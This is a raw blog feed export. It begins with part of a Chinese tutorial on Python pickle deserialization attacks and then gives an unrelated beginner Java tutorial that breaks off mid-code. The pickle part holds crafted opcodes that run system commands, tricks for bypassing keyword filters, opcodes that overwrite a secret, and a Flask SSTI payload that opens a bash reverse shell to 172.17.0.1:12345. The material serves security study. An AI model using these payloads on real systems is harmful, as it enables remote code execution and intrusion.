class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">tuple</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure><p>用到的核心其实就是:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">NEWOBJ  = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br></pre></td></tr></table></figure><h3 id="绕过敏感字符"><a href="#绕过敏感字符" class="headerlink" title="绕过敏感字符"></a>绕过敏感字符</h3><h4 id="S"><a href="#S" class="headerlink" title="S"></a>S</h4><p><code>S</code> 操作码本身是 String ，是支持十六进制的识别的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S&#x27;flag&#x27; =&gt; S&#x27;\x66\x6c\x61\x67&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c__main__</span><br><span class="line">secret</span><br><span class="line">(S<span class="string">&#x27;\x6bey&#x27;</span>  <span class="comment">#key</span></span><br><span class="line">S<span class="string">&#x27;asd&#x27;</span></span><br><span class="line">db.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p><code>V</code>指令的用法，类似于指令<code>S</code></p><p><img src="https://bu.dusays.com/2024/05/13/6641a598118c9.png" alt="image-20240321210631706"></p><p>在指令集中存在一个 <code>V</code> 用于操作 Unicode 字符，对原本的 S 进行替换后即可在单引号内使用 Unicode 编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S&#x27;flag&#x27; =&gt; V&#x27;\u0066\u006C\u0061\u0067&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c__main__</span><br><span class="line">secret</span><br><span class="line">(V\u006bey  <span class="comment">#key</span></span><br><span class="line">S<span class="string">&#x27;asd&#x27;</span></span><br><span class="line">db.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(Vsecr\u0065t</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="内置模块获取关键字"><a href="#内置模块获取关键字" class="headerlink" title="内置模块获取关键字"></a>内置模块获取关键字</h4><p>对于已导入的模块，我们可以通过<code>sys.modules[&#39;xxx&#39;]</code>来获取该模块，然后通过内置函数dir()来列出模块中的所有属性</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d2de8.png" alt="image-20240321212228133"></p><p>可以看到模块中的属性是以列表的形式输出，我们可以用 dir 列出 admin 模块的所有属性，我们需要的 secret 属性位于最后的位置，这个时候我们就可以利用函数将这里的 secret 取出来。</p><p>由于pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串。在Python中，我们可以通过<code>reversed()</code>函数来将列表逆序，并返回一个迭代对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a598140f8.png" alt="image-20240321212312902"></p><p>然后我们可以通过<code>next()</code>函数来获取迭代对象的下一个元素，默认从第一个元素开始。最终可以构造如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(<span class="built_in">reversed</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;admin&#x27;</span>]))))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure><p>reversed 函数将 dir 得到的列表逆序，然后使用 next 取第一个即可，写到 opcode 中就是如下构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line">   </span><br><span class="line">获取到了secret字符串，下面就容易构造变量覆盖了</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">I1             //指定参数、索引</span></span><br><span class="line"><span class="string">db(S&#x27;admin&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="flask-框架下结合-SSTI-进行-bypass"><a href="#flask-框架下结合-SSTI-进行-bypass" class="headerlink" title="flask 框架下结合 SSTI 进行 bypass"></a>flask 框架下结合 SSTI 进行 bypass</h3><p>简单放一下 payload，大体的思路就是调用 flask.templating 的 render_template_string 来传入 SSTI 的相关 paylaod</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&quot;cflask.templating\nrender_template_string\np0\n(S\&quot;&amp;#123;% for x in (().__class__.__base__.__subclasses__()) %&amp;#125;&amp;#123;%if x.__name__ ==&#x27;catch_warnings&#x27;%&amp;#125;&amp;#123;&amp;#123;x.__repr__.im_func.func_globals.linecache.os.system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1\&quot; &amp;&#x27;)&amp;#125;&amp;#125;&amp;#123;%endif%&amp;#125;&amp;#123;%endfor%&amp;#125;\&quot;\np1\ntp2\nRp3\n.&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础</title>
      <link href="/2024/05/13/java%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/05/13/java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA基础"><a href="#JAVA基础" class="headerlink" title="JAVA基础"></a>JAVA基础</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>1）.单行注释 &#x2F;&#x2F;</p><p>2）.多行注释</p><p>&#x2F;*</p><p>*&#x2F;</p><p>3）.文档注释   （在生成文档时会保留下）</p><p>&#x2F;**</p><p>*&#x2F;</p><p>第一个java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h2 id="输出语句"><a href="#输出语句" class="headerlink" title="输出语句"></a>输出语句</h2><p>System.out.print</p><p>System.out.println</p><p>System.out.printf</p><p><strong>区别：</strong></p><p>1、print 将它的参数显示在命令窗口，并将输出光标定位在所显示的最后一个字符之后。</p><p>   System.out.print(参数) 参数不能为空.必须有</p><p>2、println 将它的参数显示在命令窗口，并在结尾加上换行符，将输出光标定位在下一行的开始。</p><p>   System.out.println() 可以不写参数</p><p>3、printf 是格式化输出的形式（即可以控制输出的格式）。</p><ul><li><p>%d的意思是一个int值的占位符</p></li><li><p>%f为一个double 或float值的占位符</p></li><li><p>%s为一个string值的占位符</p></li><li><p>%.2f：输出两位小数点</p></li><li><p>%.3f：输出三位小数点</p></li></ul><p>例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> i=<span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">double</span> j=<span class="number">10.4</span>;</span><br><span class="line"></span><br><span class="line">            System.out.print(<span class="string">&quot;i,j的值分别为:&quot;</span>+i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line"></span><br><span class="line">            System.out.print(<span class="string">&quot;\n&quot;</span>);<span class="comment">//换行</span></span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;i,j的值分别为:&quot;</span>+i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line"></span><br><span class="line">            System.out.printf(<span class="string">&quot;i的值为%d,j的值为%f&quot;</span>,i,j);</span><br><span class="line"></span><br><span class="line">            System.out.println();<span class="comment">//换行</span></span><br><span class="line"></span><br><span class="line">            System.out.printf(<span class="string">&quot;i的值为%d,j的值为%.2f&quot;</span>,i,j);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4a96621b.png" alt="image-20240311085719107"></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>1）定义：</p><p>计算机内存中的一块存储空间，是存储数据的基本单元</p><p>2）声明：</p><p>​      数据类型 变量名；</p><p>​      赋值：</p><p>​      变量名&#x3D;值；</p><p>​      使用：</p><p>​      System.out.print(变量名)；</p><p>可以声明时一起赋值</p><p>3）标识符</p><p>由字母，货币符号（英文状态下的），下划线（-），数字组成</p><p>不能以数字开头</p><p>不能与关键字、保留字重名</p><p>不能与字面常量重名（true  false  null）</p><p>命名方法：</p><p>a.帕斯卡法（pascal）每个单词首字母大写</p><p>b.驼峰命名法（camel）首单词首字母小写，后续单词首字母大写</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>java中的变量有严格的数据类型区分（强类型语言）</p><p>java中任意一个值都有其对应的类型的变量。</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae94188.png" alt="image-20240304232122039"></p><p>基本数据类型共8种</p><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b740734.png" alt="image-20240304232204722"></p><p>整数默认为int(运算时) 但在具体赋值时会<strong>窄化</strong>成具体类型</p><p>如果为long类型（超过int的极限时），需要在值的后面加“L”（不加就会转换成int）</p><h3 id="小数（浮点型）"><a href="#小数（浮点型）" class="headerlink" title="小数（浮点型）"></a>小数（浮点型）</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b319e6f.png" alt="image-20240304233038730"></p><p>浮点型数值采用科学计数法表示</p><p>double为浮点数的默认类型，要切换成float类型时，要在后面的值加“f”</p><h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa4f376.png" alt="image-20240304233712045"></p><p>可直接赋值true&#x2F;false</p><p>也可以赋值一个结果为true&#x2F;false的表达式</p><p>boolean不能参与算数运算</p><h3 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h3><p>ascii码：<br>0：48  A：65   a：97</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa7eaa4.png" alt="image-20240304234149810"></p><p>赋值方式：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af1e208.png" alt="image-20240304234309189"></p><p>转义字符：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac51bbe.png" alt="image-20240304234358568"></p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4a94fd4d.png" alt="image-20240304234553646"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa3ff7b.png" alt="image-20240304234622463"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b630981.png" alt="image-20240304234858505"></p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>1.自动类型转换</p><blockquote><p>两种类型相互兼容</p><p>目标类型大于原类型</p></blockquote><p>short-&gt;int</p><p>2.强制类型转换</p><blockquote><p>两种类型相互兼容</p><p>目标类型小于原类型</p></blockquote><p>int-&gt;short</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b41f55c.png" alt="image-20240304235407561"></p><p>强制转换规则：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7baedc.png" alt="image-20240304235613018"></p><p>自动类型提升</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5d4e5c.png" alt="image-20240304235718465"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5249d5.png" alt="image-20240305001102597"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=10 b=8</span><br><span class="line"></span><br><span class="line">System.out.print(&quot;a+b=&quot;+a+b);</span><br></pre></td></tr></table></figure><p>此时会输出108 因为字符串拼接会转换成字符串 所以”a+b&#x3D;”+a拼接了（10）</p><p>+（拼接符）b（8）成字符串拼接在一起（108）</p><p>要想输出正确结果，就要加括号，改变其运算顺序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(&quot;a+b=&quot;+(a+b));</span><br></pre></td></tr></table></figure><p>这样就是18</p><p>同理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(&quot;a+b=&quot;+a-b)；</span><br></pre></td></tr></table></figure><p>报错 因为字符串不能与整数相减</p><p>要改成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(&quot;a+b=&quot;+(a-b));</span><br></pre></td></tr></table></figure><p>特殊：</p><p>除数不能为0</p><p>5&#x2F;0  报错-&gt;by zero</p><p>5.0&#x2F;0   报错-&gt;infinity（无限大）</p><p>-5.0&#x2F;0   报错-&gt;-infinity（无限小）</p><p>0.0&#x2F;0   ——&gt;NaN(not a number)</p><p>++–</p><blockquote><p>++在前，先自增再使用自增后的结果</p><p>++在后，先使用自增前的结果再自增</p></blockquote><p>–同理</p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算符：等号右边赋值给等号左边</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa38851.png" alt="image-20240311083157302"></p><p>例：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa3ff75.png" alt="image-20240311084157980"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a9bf250.png" alt="image-20240311084638663"></p><p>因为+是一个二元运算符 会将s1+s2的结果转换为int 此时要强制转换才行</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a972123.png" alt="image-20240311084349974"></p><p>而+&#x3D;是一个复合赋值运算符 是一元运算符 会将结果窄化，窄化为short 所以不影响</p><h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p>两个操作数进行比较</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a9e8aca.png" alt="image-20240311085834056"></p><p>比较结果都是布尔值</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p><strong>两个boolean</strong>类型的操作数或表达式进行逻辑比较</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa77991.png" alt="image-20240311090141834"></p><p>短路与：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a9eeb53.png" alt="image-20240311090950018"></p><p>正常 此时b&#x3D;11</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa21f28.png" alt="image-20240311091012052"></p><p>短路 此时b&#x3D;10 因为在判断a&gt;9为false后 因为后面式&amp;&amp; 程序认为不用判断后续程序即可得到结果false，所以没有执行b++&#x3D;&#x3D;10 ,所以b&#x3D;10</p><p>但若是前面为a&gt;b 则仍要执行后续代码</p><p>同理有短路或</p><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>将判断后的结果赋值给变量</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4acb702d.png" alt="image-20240311091830570"></p><h3 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h3><ul><li>括号优先</li><li>算数&gt;关系&gt;赋值</li><li>*&#x2F;%&gt;+-</li><li>!&gt;&amp;&amp;&gt;||</li></ul><p><img src="https://bu.dusays.com/2024/05/13/6641a4b170b3d.png" alt="image-20240311092159826"></p><h2 id="控制台输入"><a href="#控制台输入" class="headerlink" title="控制台输入"></a>控制台输入</h2><p><img src="https://bu.dusays.com/2024/05/13/6641a4b011293.png" alt="image-20240311092504993"></p><p>理解：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  <span class="comment">//导包</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Scanner scanner <span class="comment">/*这里的scanner相当于定义扫描仪*/</span>= <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">        <span class="type">double</span> <span class="variable">width</span> <span class="operator">=</span> scanner.nextDouble(); <span class="comment">//小数用nextDouble </span></span><br><span class="line">        <span class="type">double</span> <span class="variable">height</span> <span class="operator">=</span> scanner.nextDouble();  </span><br><span class="line">        <span class="type">double</span> <span class="variable">area</span> <span class="operator">=</span> width * height;  </span><br><span class="line">        <span class="type">double</span> <span class="variable">perimeter</span> <span class="operator">=</span> (width + height) * <span class="number">2</span>;  </span><br><span class="line">        System.out.println(<span class="string">&quot;The area is &quot;</span> + area);  </span><br><span class="line">        System.out.println(<span class="string">&quot;The perimeter is &quot;</span> + perimeter);  </span><br><span class="line">  </span><br><span class="line">        scanner.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;<span class="comment">//导包</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestS</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//所以扫描仪的名字可以自定义（这里的input 上面的scanner）</span></span><br><span class="line">        <span class="comment">//这里可以来一些提示输入</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> input.next();<span class="comment">//next()是接收字符串</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> input.nextInt();<span class="comment">//接收整数用nextInt()</span></span><br><span class="line">        <span class="type">char</span> gender=input.next().charAt(<span class="number">0</span>);<span class="comment">//charAt(0)表示提取接收字符串的第一个字符 截断 所以这里是接收字符</span></span><br><span class="line">        System.out.println(”姓名： “+name);</span><br><span class="line">        System.out.println(”年龄： “+age); </span><br><span class="line">        System.out.println(”性别： “+gender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="简单if"><a href="#简单if" class="headerlink" title="简单if"></a>简单if</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4a980f43.png" alt="image-20240313101950939"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner.scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;成绩：&quot;</span>)；</span><br><span class="line">            <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(a&gt;=<span class="number">90</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;周末放假&quot;</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa2c333.png" alt="image-20240313102859465"></p><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4a98b6f4.png" alt="image-20240313103024331"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;成绩：&quot;</span>)；</span><br><span class="line">            <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(a&gt;=<span class="number">90</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;周末放假&quot;</span>)；</span><br><span class="line">        &#125;eles&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;滚去学习&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa3cd15.png" alt="image-20240313103354178"></p><h3 id="多重if"><a href="#多重if" class="headerlink" title="多重if"></a>多重if</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa2c8b7.png" alt="image-20240313103533397"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scannr;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(钱：);</span><br><span class="line">        <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (a&gt;=<span class="number">500</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;法拉利&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a&gt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;保时捷&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a&gt;=<span class="number">50</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;奔驰&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;大众&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;五菱宏光，都有能买的车了，你还要什么自行车&quot;</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从大到小排或从小到大排</p><p>要连续区间</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab325cd.png" alt="image-20240313110232793"></p><h3 id="嵌套if"><a href="#嵌套if" class="headerlink" title="嵌套if"></a>嵌套if</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa5f750.png" alt="image-20240313110347076"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;预赛成绩&quot;</span>)；</span><br><span class="line">        <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(a&lt;=<span class="number">10</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;性别&quot;</span>)；</span><br><span class="line">                <span class="type">char</span> gender=scanner.next().charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(gander==<span class="string">&#x27;男&#x27;</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;男子决赛&quot;</span>)；</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;女子决赛&quot;</span>)；</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;很遗憾&quot;</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4aab4278.png" alt="image-20240313111734290"></p><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa7993f.png" alt="image-20240313112041530"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab7327f.png" alt="image-20240313112544753"></p><p>只要是Int即可判断</p><p>byte short char 都可以转换成Int</p><p>string本质上是int(hashCode)</p><p>long不行Long不能转成32位的int</p><p>case的值不能相同</p><p>当执行成功一个case会继续向下执行直到遇到break</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span 